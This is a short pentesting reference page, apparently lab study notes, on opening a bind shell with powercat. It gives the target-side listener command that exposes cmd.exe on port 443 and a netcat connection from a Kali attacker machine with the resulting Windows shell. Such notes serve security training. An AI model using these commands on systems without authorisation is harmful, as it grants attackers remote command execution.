---
description: Creating bind shells with powercat
---

# Powercat

## Basic Bind Shell

The usage of a bind shell with powercat is similar to the other tools listed.

### Target Machine

First a listener must be started with powercat on the target machine:

```powerquery
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

<table><thead><tr><th width="155">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-l</code></td><td>Tells powercat to <strong>listen</strong> for a connection</td></tr><tr><td><code>-p {PORT}</code></td><td>Specifies the listening <strong>port</strong></td></tr><tr><td><code>-e {APP}</code></td><td>Application that will be <strong>executed</strong> upon connection</td></tr></tbody></table>

### Attacker Machine

Application of the attacker's choice can be used for connection (in this example netcat is used).

```bash
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
